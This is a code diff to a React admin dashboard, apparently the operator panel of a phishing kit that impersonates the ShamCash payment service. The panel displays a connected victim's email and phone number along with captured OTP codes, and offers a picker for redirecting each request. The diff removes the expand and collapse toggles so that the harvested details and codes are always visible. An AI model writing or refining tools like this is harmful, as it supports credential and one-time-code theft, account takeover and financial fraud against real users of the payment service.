@@ -1,7 +1,7 @@
 import { useState, useEffect, useRef } from "react";
 import {
   CheckCircle, XCircle, ArrowRightLeft, Clock, Bell,
-  KeyRound, ShieldCheck, UserRound, X, ChevronDown, ChevronUp,
+  KeyRound, ShieldCheck, UserRound, X,
   Wifi, WifiOff, PenLine, Send
 } from "lucide-react";
 
@@ -52,9 +52,7 @@ export function ShamCashAdmin() {
   const [requests, setRequests] = useState<Request[]>([]);
   const [hasNew, setHasNew] = useState(false);
   const [redirectPickerId, setRedirectPickerId] = useState<string | null>(null);
-  const [expandedInfoId, setExpandedInfoId] = useState<string | null>(null);
   const [visitor, setVisitor] = useState<Visitor | null>(null);
-  const [expandedVisitor, setExpandedVisitor] = useState(false);
   const knownVisitorId = useRef<string | null>(null);
 
   useEffect(() => {
@@ -184,17 +182,10 @@ export function ShamCashAdmin() {
                     <span className="text-[12px] text-[#c9ccdb]/40 flex items-center gap-1">
                       <Clock className="h-3 w-3" />{visitor.connectedAt}
                     </span>
-                    <button
-                      onClick={() => setExpandedVisitor(!expandedVisitor)}
-                      className="flex items-center gap-1 rounded-[8px] bg-white/5 hover:bg-white/10 px-2 py-1 text-[12px] font-bold text-white/60 transition-colors"
-                    >
-                      {expandedVisitor ? <><ChevronUp className="h-3.5 w-3.5" /> إخفاء</> : <><ChevronDown className="h-3.5 w-3.5" /> المعلومات</>}
-                    </button>
                   </div>
                 </div>
 
-                {expandedVisitor && (
-                  <div className="space-y-2 pt-1 border-t border-white/[0.06]">
+                <div className="space-y-2 pt-1 border-t border-white/[0.06]">
                     {[
                       { label: "البريد الإلكتروني", value: visitor.data.email, icon: <UserRound className="h-3.5 w-3.5" /> },
                       { label: "رقم الهاتف", value: visitor.data.phone, icon: <span className="text-[11px]">📞</span> },
@@ -209,7 +200,6 @@ export function ShamCashAdmin() {
                       </div>
                     ))}
                   </div>
-                )}
               </div>
             </div>
           )}
@@ -221,7 +211,7 @@ export function ShamCashAdmin() {
                 if (req.kind === "otp") {
                   const r = req as OtpRequest;
                   const showPicker = redirectPickerId === r.id;
-                  const showInfo = expandedInfoId === r.id;
+                  const showInfo = true;
                   const vd = visitor?.data;
                   return (
                     <div key={r.id} className="rounded-[18px] bg-[#1e2640] border border-[#657bd8]/30 p-4 space-y-3 shadow-[0_8px_24px_rgba(101,123,216,0.1)]">
@@ -243,14 +233,6 @@ export function ShamCashAdmin() {
                             <p className="text-[10px] text-[#c9ccdb]/50 mb-0.5">رمز OTP</p>
                             <p className="text-[18px] font-extrabold text-white tracking-[0.12em]" dir="ltr">{r.code || "------"}</p>
                           </div>
-                          <button
-                            onClick={() => setExpandedInfoId(showInfo ? null : r.id)}
-                            className={`flex items-center gap-1 rounded-[8px] px-2.5 py-1.5 text-[12px] font-bold transition-colors
-                              ${showInfo ? "bg-[#657bd8]/30 text-[#657bd8]" : "bg-white/5 text-white/50 hover:bg-white/10"}`}
-                          >
-                            {showInfo ? <ChevronUp className="h-3.5 w-3.5" /> : <ChevronDown className="h-3.5 w-3.5" />}
-                            المعلومات
-                          </button>
                         </div>
                       </div>
 
